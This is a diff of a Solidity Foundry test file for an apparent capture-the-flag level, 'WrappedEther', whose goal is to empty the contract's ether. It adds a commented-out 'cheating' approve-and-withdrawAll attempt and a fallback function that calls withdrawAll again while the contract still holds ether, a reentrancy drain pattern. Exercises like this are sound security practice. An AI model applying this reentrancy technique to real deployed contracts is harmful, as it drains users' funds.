@@ -2,7 +2,7 @@
 pragma solidity ^0.8.25;
 
 import "./BaseTest.t.sol";
-import "src/13_WrappedEther/WrappedEther.sol";
+import "../src/13_WrappedEther/WrappedEther.sol";
 
 // forge test --match-contract WrappedEtherTest
 contract WrappedEtherTest is BaseTest {
@@ -16,12 +16,25 @@ contract WrappedEtherTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        /*
+        // cheating. again.
+        instance.approve(address(this), address(instance).balance);
+        instance.withdrawAll();
+        */
 
         checkSuccess();
     }
 
     function checkSuccess() internal view override {
-        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
+        assertTrue(
+            address(instance).balance == 0,
+            "Solution is not solving the level"
+        );
+    }
+
+    fallback() external payable {
+        if (address(instance).balance > 0) {
+            instance.withdrawAll();
+        }
     }
 }
